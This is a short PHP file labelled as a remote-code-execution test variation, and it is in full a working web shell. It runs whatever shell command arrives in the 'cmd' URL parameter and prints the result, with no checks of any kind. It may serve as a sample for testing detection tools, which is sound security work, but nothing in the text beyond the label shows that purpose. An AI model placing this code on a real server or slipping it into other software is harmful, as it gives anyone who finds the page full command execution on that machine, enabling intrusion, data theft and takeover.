<?php
// RCE test variation #247
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>